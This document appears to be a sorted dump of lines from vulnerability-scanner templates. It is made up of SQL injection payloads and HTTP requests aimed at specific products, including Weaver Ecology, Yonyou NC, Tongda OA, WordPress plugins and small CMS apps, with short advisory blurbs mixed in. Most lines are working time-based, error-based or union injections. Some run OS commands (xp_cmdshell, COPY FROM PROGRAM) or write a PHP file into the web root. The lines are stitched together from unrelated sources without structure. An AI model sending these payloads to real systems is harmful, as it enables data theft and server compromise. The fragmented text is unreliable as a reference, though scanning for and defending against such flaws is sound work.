+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
+<sql>select 1111123</sql>
+<sql>select convert(int,CHAR(100)+CHAR(105)+CHAR(108)+CHAR(101)+CHAR(109)+CHAR(109)+CHAR(97)) FROM syscolumns</sql>
+<string>select user()</string>
+<tem:EmpLoginID>1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(select sys.fn_varbintohexstr(hashbytes('md5','999999999')))+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'</tem:EmpLoginID>
+<urn:in0>-1 OR 1=1 AND 1=1</urn:in0>
+<urn:in0>-1 OR 1=1 AND 1=2</urn:in0>
+<urn:in0>-1' OR 6=5 AND 1=1 or '1'='</urn:in0>
+<urn:in0>-1' OR 6=6 AND 1=1 or '1'='</urn:in0>
+<userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{num}}'),2))</userIdList>
+<web:string>1=1 AND 5615=5615</web:string>
+A SQL injection vulnerability exists in the JeePlus low-code development platform, allowing attackers to manipulate database queries.This can lead to unauthorized data access, modification, or potential compromise of the application.
+APP_UNIT=1%2527or updatexml(1,concat(0x2a, database()),1) and%25271%2527=%25271
+Accept-Charset: "' or sleep(30)='"
+Accept-Datetime: "' or sleep(30)='"
+Accept-Encoding: "' or sleep(30)='"
+Accept-Language: "' or sleep(30)='"
+Accept: "' or sleep(30)='"
+Accept: */*
+Accept: application/json, text/javascript, */*; q=0.01
+Accept: text/html, */*; q=0.01
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Access URL:/webroot/decision/view/ReportServer?test=&n=, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.
+Ajax=1&IsEvent=1&Obj=O4F&Evt=click&this=O4F&"_fp_=_S_ID=mQ5Fu33Xvo109ED63C3&O33= 0  '('--(SELECT @@version&O37= 0  11111"&_seq_=2&_uo_=O0
+Alumni Management System 1.0 contains a SQL injection vulnerability via admin/login in the username parameter. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+An SQL injection vulnerability has been identified in the commentList.asp file of AspCMS. Exploiting this vulnerability, an attacker can illicitly acquire the administrator's MD5 password.
+An authentication bypass vulnerability was introduced by changing the JWT whitelist configuration to use a regex pattern, allowing unauthorized access to any path containing /auth and leading to SQL Injection.
+An unauthenticated Time-Based SQL injection found in Webkul QloApps 1.6.0 via GET parameter date_from, date_to, and id_product allows a remote attacker to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database.
+Applezeed's 'travel-details.php?id=' URL with possible time-based SQL injection (SQLi) vulnerability allows attackers to manipulate the 'id' parameter, potentially causing delays in SQL queries and unauthorized retrieval of travel information from the database
+Authorization: "' or sleep(30)='"
+BEGIN DBMS_LOCK.SLEEP(5); END;
+CHAR(39,79,82,39,49,39,61,39,49)
+COPY (SELECT 'malicious') TO '/tmp/test';
+COPY shell FROM PROGRAM 'id';
+CREATE TABLE shell(output text);
+Cache-Control: "' or sleep(30)='"
+Client-ip: 1.1.1.1' AND (SELECT 1 FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(md5(1),0x23,admin_password) FROM bees_admin LIMIT 0,1))a FROM information_schema.tables GROUP by a)b)#
+Client-ip: 127.0.0.1\',(SELECT 1 FROM (SELECT count(1),concat(round(rand(0)),(SELECT MD5(123) LIMIT 0,1))a FROM information_schema.tables GROUP by a)b))#
+Company Visitor Management System 1.0 contains a SQL injection vulnerability via the login page in the username parameter. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+Connection: "' or sleep(30)='"
+Content-Disposition: form-data; name="ATTACHMENT_ID"
+Content-Disposition: form-data; name="ATTACHMENT_NAME"
+Content-Disposition: form-data; name="FILE_SORT"
+Content-Disposition: form-data; name="SORT_ID"
+Content-Disposition: form-data; name="aik_link_img"
+Content-Disposition: form-data; name="aik_link_img"; filename=""
+Content-Disposition: form-data; name="aik_link_name"
+Content-Disposition: form-data; name="aik_link_qq"
+Content-Disposition: form-data; name="aik_link_url"
+Content-Disposition: form-data; name="aik_notice_title"
+Content-Disposition: form-data; name="aik_notice_url"
+Content-Disposition: form-data; name="code"
+Content-Disposition: form-data; name="fromdate"
+Content-Disposition: form-data; name="lang"
+Content-Disposition: form-data; name="mail"
+Content-Disposition: form-data; name="nich"
+Content-Disposition: form-data; name="password"
+Content-Disposition: form-data; name="password2"
+Content-Disposition: form-data; name="search"
+Content-Disposition: form-data; name="submit.x"
+Content-Disposition: form-data; name="submit.y"
+Content-Disposition: form-data; name="todate"
+Content-Disposition: form-data; name="update"
+Content-Disposition: form-data; name="user"
+Content-Length: "' or sleep(30)='"
+Content-MD5: "' or sleep(30)='"
+Content-Type: "' or sleep(30)='"
+Content-Type: multipart/form-data; boundary=---------------------------47891759416863
+Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7oFL75gOdBB1Y9pr
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXLYuClHc0fZFSeK8
+Cookie: "%';SELECT PG_SLEEP(5)--"
+Cookie: "' WAITFOR DELAY '0:0:5'--"
+Cookie: "' or sleep(30)='"
+Cookie: "'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z"
+Cookie: "'| |pg_sleep(5)--"
+Cookie: "(select(0)from(select(sleep(5)))v)/*' +(select(3)from(select(sleep(5)))v)+ '\" +(select(0)from(select(sleep(5)))v)+ \"*/"
+Cookie: "-1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'"
+Cookie: "1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='"
+Cookie: "1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-1337"
+Cookie: "1 or sleep(5)#"
+Cookie: "1'XOR(if(now()=sysdate(),sleep(5),0))OR'"
+Cookie: "XOR(if(now()=sysdate(),sleep(5),0))OR'"
+Cookie: "if(now()=sysdate(),sleep(5),0)"
+Cookie: "pg_sleep(5)"
+Cookie:members_uc_info[reg_type]=1;members_uc_info[utype]=2;members_uc_info[mobile][0]=match;members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select md5(233))),0) -- a
+Date: "' or sleep(30)='"
+Direct SQL Command Injection is a technique where an attacker creates or alters existing SQL commands to expose hidden data,
+EXEC xp_cmdshell 'whoami';
+Ecology 9 contains a SQL injection vulnerability via a POST request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+Ecology OA system improperly filters incoming data from users, resulting in a SQL injection vulnerability. Remote and unauthenticated attackers can use this vulnerability to conduct SQL injection attacks and steal sensitive database information.
+Employee Management System 1.0 contains a SQL injection vulnerability via the username parameter.  An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+EnjoyRMIS GetOAById has a SQL injection vulnerability, through which an attacker can obtain sensitive database information and even control the server.
+Expect: "' or sleep(30)='"
+Fangdee Smart Platform system's `GetCompanyItem` endpoint has an SQL injection vulnerability that allows attackers to execute arbitrary SQL commands.
+FineCMS 5.0.10 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+Forwarded: "' or sleep(30)='"
+From: "' or sleep(30)='"
+Fun=msaAdminLogon&username=admin'%20or%20'a'%3D'a&password=a
+GET /?m=info.detail&id=1%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,(MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a) HTTP/1.1
+GET /AgentBoard.XGI?user='||'1&cmd=UserLogin HTTP/1.1
+GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
+GET /C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+GET /CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1'+union+select+sum(255*255)--+z HTTP/1.1
+GET /Org/service/Service.asmx/GetUserByUserCode?userCode=1%27-1/user--%27&EncryptData=1 HTTP/1.1
+GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%201-- HTTP/1.1
+GET /UniExServices/link/queryLinklnfo?address=%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1
+GET /admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5(202072102)%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b' HTTP/1.1
+GET /aikcms2.0/admin/page/video/videogroup_edit.php?id=3%20and%20if(1,sleep(3),1)%23 HTTP/1.1
+GET /api/dp/rptsvcsyncpoint?ccid=1%27;SELECT%20PG_SLEEP(3)-- HTTP/1.1
+GET /api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20 HTTP/1.1
+GET /blog-search?search=deneme%27%20AND%20(SELECT%201642%20FROM%20(SELECT(SLEEP(6)))Xppf)%20AND%20%27rszk%27=%27rszk HTTP/2
+GET /bnb.php?bnbId=&issue=12%20and%20(select%204386%20from(select%20count(*)%2cconcat(md5(123)%2c(select%20(elt(4386%3d4386%2c1)))%2c0x716b7a6271%2cfloor(rand(0)*2))x%20from%20information_schema.plugins%20group%20by%20x)a) HTTP/1.1
+GET /cgztbweb/VisitorWeb/VistorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAY%20'0:0:0'--&ywtype=GETParentProjectName HTTP/1.1
+GET /cgztbweb/VisitorWeb/VistorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAY%20'0:0:5'--&ywtype=GETParentProjectName HTTP/1.1
+GET /city.php?city=[-1%27+/*!50000union*/+select+1,2,3,4,5,md5(233),7,8,9--%20-] HTTP/1.1
+GET /collections?id=2'+AND+(SELECT+1492+FROM+(SELECT(SLEEP(7)))HsLV)+AND+'KEOa'='KEOa HTTP/1.1
+GET /common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:5%27-- HTTP/1.1
+GET /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
+GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+ HTTP/1.1
+GET /csz-cms/plugin/article/search?p=3D1%27%22)%20AND%20(SELECT%203910%20FROM%20(SELECT(SLEEP(6)))qIap)--%20ogLS HTTP/1.1
+GET /defaultroot/WorkflowCommonAction.do?flag=back&curActivityId=1%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1
+GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:3'-- HTTP/1.1
+GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:6'-- HTTP/1.1
+GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:7'-- HTTP/1.1
+GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:9'-- HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/operate/wf_accessory_delete.jsp;?wf_work_accessory_id=1%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),3)--%20OfwB HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/operate/wf_accessory_delete.jsp;?wf_work_accessory_id=1%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)--%20OfwB HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/operate/wf_accessory_delete.jsp;?wf_work_accessory_id=1%20WAITFOR%20DELAY%20%270:0:3%27--%20FMZL HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/operate/wf_accessory_delete.jsp;?wf_work_accessory_id=1%20WAITFOR%20DELAY%20%270:0:6%27--%20FMZL HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;?recordId=1%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),3)--%20OfwB HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;?recordId=1%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)--%20OfwB HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;?recordId=1;waitfor%20delay%20%270:0:3%27--+ HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;?recordId=1;waitfor%20delay%20%270:0:6%27--+ HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),3)--%20OfwB HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)--%20OfwB HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1%20WAITFOR%20DELAY%20%270:0:3%27--%20FMZL HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1%20WAITFOR%20DELAY%20%270:0:6%27--%20FMZL HTTP/1.1
+GET /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+GET /defaultroot/platform/portal/portlet/pic/pic.jsp?num=1&channelId=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),3)--%20OfwB HTTP/1.1
+GET /defaultroot/platform/portal/portlet/pic/pic.jsp?num=1&channelId=1%27%20WAITFOR%20DELAY%20%270:0:3%27--%20FMZL HTTP/1.1
+GET /defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp;?DocumentID=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)-- HTTP/1.1
+GET /defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp;?DocumentID=1%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+GET /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp;?RecordID=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)-- HTTP/1.1
+GET /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp;?RecordID=1%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+GET /defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp;?RecordID=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),3)--%20OfwB HTTP/1.1
+GET /defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp;?RecordID=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)--%20OfwB HTTP/1.1
+GET /defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp;?RecordID=1%27%20WAITFOR%20DELAY%20%270:0:3%27-- HTTP/1.1
+GET /defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp;?RecordID=1%27%20WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
+GET /defaultroot/public/iWebOfficeSign/DocumentEdit_unite.jsp;?RecordID=1'+AND+8579=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(97)||CHR(72)||CHR(98),5)+AND+'TZFK'='TZFK HTTP/1.1
+GET /defaultroot/public/iWebOfficeSign/DocumentEdit_unite.jsp;?RecordID=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NVL(CAST(255*255+AS+VARCHAR(4000)),CHR(32)),NULL,NULL,NULL+FROM+DUAL--+1 HTTP/1.1
+GET /defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit.jsp;?RecordID=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)--%20OfwB HTTP/1.1
+GET /defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit.jsp;?RecordID=1%27%20WAITFOR%20DELAY%20%270:0:5%27--%20FMZL HTTP/1.1
+GET /defaultroot/public/iWebPDF/DocumentEdit.jsp;?RecordID=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)-- HTTP/1.1
+GET /defaultroot/public/iWebPDF/DocumentEdit.jsp;?RecordID=1%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+GET /defaultroot/wpsservlet?option=getSign&userId=1+AND+8579=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(97)||CHR(72)||CHR(98),5)+AND+'TZFK'='TZFK --+z&orgIdString=1&domainId=1 HTTP/1.1
+GET /defaultroot/wpsservlet?option=getSign&userId=1;WAITFOR%20DELAY%20%270:0:5%27--&orgIdString=1&domainId=1 HTTP/1.1
+GET /defaultroot/wpsservlet?option=getSignPicture&signatureID=1+AND+8579=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(97)||CHR(72)||CHR(98),3)+AND+'TZFK'='TZFK --+z HTTP/1.1
+GET /defaultroot/wpsservlet?option=getSignPicture&signatureID=1;WAITFOR%20DELAY%20'0:0:3'-- HTTP/1.1
+GET /docexchangeManage/checkGroupCode.js%70?code=1%27;waitfor+delay+%270:0:5%27-- HTTP/1.1
+GET /ebvp/advorappcoll/complainbilldetail?pageId=login&pk_complaint=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
+GET /ebvp/infopub/warningDetailInfo?pageId=login&pkMessage=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+GET /financial_times.php?issue=323%20and%20(select%204386%20from(select%20count(*)%2cconcat(md5(123)%2c(select%20(elt(4386%3d4386%2c1)))%2c0x716b7a6271%2cfloor(rand(0)*2))x%20from%20information_schema.plugins%20group%20by%20x)a) HTTP/1.1
+GET /flow/fl_define_flow_chart_show.aspx?id=(SELECT @@version) HTTP/1.1
+GET /general/ems/manage/search_excel.php?LOGIN_USER_ID=1&EMS_TYPE=1%df'and extractvalue(1, concat(0x5c,(database())))%23 HTTP/1.1
+GET /general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 where 1={\=' 1} union select uid,sid from user_online -- ' HTTP/1.1
+GET /general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),user(),255*255,(substring((select%20md5(255*255)),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23 HTTP/1.1
+GET /hbr.php?issue=12%20and%20(select%204386%20from(select%20count(*)%2cconcat(md5(123)%2c(select%20(elt(4386%3d4386%2c1)))%2c0x716b7a6271%2cfloor(rand(0)*2))x%20from%20information_schema.plugins%20group%20by%20x)a) HTTP/1.1
+GET /hmrao.php?s=/Admin/appdel&list=1')%20AND(SELECT%201%20FROM%20(SELECT(SLEEP(4)))a)AND('1 HTTP/1.1
+GET /hmrao.php?s=/Admin/appsave&appid=1');select+'<?php+echo+md5({{num}});unlink(__FILE__);?>'+into+dumpfile+'../../WebRoot/{{filename}}';--+</ HTTP/1.1
+GET /homepage/search/?q=1%%27)+and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,md5(520),0x7e)))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23&x=0&y=0 HTTP/1.1
+GET /index.php/Index?ext_price%3D1)/**/and/**/1%3C%3E2/**/union/**/select/**/1,2,3,4,hex(123456789),6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3--/**/ HTTP/1.1
+GET /index.php/Search/index?keyword=aaaa&updatexml(1,concat(0x7e,(SELECT/**/md5(123)/**/limit/**/0,1),0x7e),1));%23=123 HTTP/1.1
+GET /index.php?route=product/search&search=')+AND+(SELECT+8368+FROM+(SELECT(SLEEP(7)))uUDJ)--+Nabb HTTP/1.1
+GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(4)))v)&type=list HTTP/1.1
+GET /jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/1,md5({{payload}})%20%23 HTTP/1.1
+GET /json/newslist?key=111&limit=1%20procedure%20analyse(extractvalue(rand(),concat(0x7e,md5(123))),1) HTTP/1.1
+GET /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
+GET /locat.php?locat=[-1%27+/*!50000union*/+select+1,2,3,4,5,6,md5(233),8--%20-] HTTP/1.1
+GET /mainpage/msglog.aspx?user=1%27%20and%201=convert(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27127381%27))))-- HTTP/1.1
+GET /members?sort_by%5Bproperty%5D=name&sort_by%5Bproperty_type%5D=metadata&sort_by%5Bdirection%5D=desc%2c(select*from(select(sleep(6)))a) HTTP/1.1
+GET /mobile-app/v3/?pid='+AND+(SELECT+6398+FROM+(SELECT(SLEEP(7)))zoQK)+AND+'Zbtn'='Zbtn&isMobile=chatbot HTTP/2
+GET /moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:5'--&sid=1 HTTP/1.1
+GET /newspack.php?issue=12%20and%20(select%204386%20from(select%20count(*)%2cconcat(md5(123)%2c(select%20(elt(4386%3d4386%2c1)))%2c0x716b7a6271%2cfloor(rand(0)*2))x%20from%20information_schema.plugins%20group%20by%20x)a) HTTP/1.1
+GET /pages/allgallary.php?idcatall=2&idcat=-2171%27%20UNION%20ALL%20SELECT%20CONCAT(0x7176707071,md5(123),0x7178767671)--%20UgIm HTTP/1.1
+GET /pmb/opac_css/ajax.php?categ=storage&datetime=undefined&id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(7)))SHde)&module=ajax&sub=save&token=undefined HTTP/2
+GET /portal/attachment_getAttList.action?bean.TabName=1&bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO HTTP/1.1
+GET /portal/pt/PaWfm/open?pageId=login&proDefPk=11';waitfor+delay+'0:0:6'-- HTTP/1.1
+GET /portal/pt/downTax/download?pageId=login&classid=1'waitfor+delay+'0:0:4'-- HTTP/1.1
+GET /portal/pt/erfile/down/bill?pageId=login&id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),4)-- HTTP/1.1
+GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
+GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proInsPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
+GET /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B"orderBy":"1%20and%201=updatexml(1,concat(0x7e,(select%20md5(10086)),0x7e),1)--"%7D/extend/%7B%7D HTTP/1.1
+GET /product-details.php?id=1%20AND%20(SELECT%206812%20FROM%20(SELECT(SLEEP(6)))DddL) HTTP/1.1
+GET /search?1%3D1)and(updatexml(1,concat(0x7e,(SELECT/**/md5(123)),0x7e),1))--=1 HTTP/1.1
+GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
+GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method=&repID=1%27);WAITFOR+DELAY+%270:0:6%27-- HTTP/1.1
+GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1';+{{sqlserver}} HTTP/1.1
+GET /state.php?country=[-1%27+/*!50000union*/+select+1,2,3,4,md5(233),6--%20-] HTTP/1.1
+GET /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1';waitfor+delay+'0:0:4'+-- HTTP/1.1
+GET /travel-detail.php?id=1%27AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(6)))bAKL)%20AND%20%27vRxe%27=%27vRxe HTTP/2
+GET /u8qx/SelectDMJE.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+GET /videoseyret.php?id=95%20AND%20(SELECT%204581%20FROM%20(SELECT(SLEEP(6)))NyiX) HTTP/1.1
+GET /w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree?params=child&treetype=1&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&kind=2&issuperuser=1&manageprive=1&action=1&target=1&backdate=1&jump=1 HTTP/1.1
+GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A5%27--&flag=1 HTTP/1.1
+GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A6%27--&flag=1 HTTP/1.1
+GET /wp-admin/admin.php?page=wps_pages_page&type=1&ID=1+AND+(SELECT+*+from+(select+SLEEP(7))a) HTTP/1.1
+GET /wp-json/notificationx/v1/notification/1?api_key={{md5('{{apikey}}')}}&id[1]=%3d(SELECT/**/1/**/WHERE/**/SLEEP(6)) HTTP/1.1
+GET /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)+union+all+select+1,2,(md5({{num}})),4# HTTP/1.1
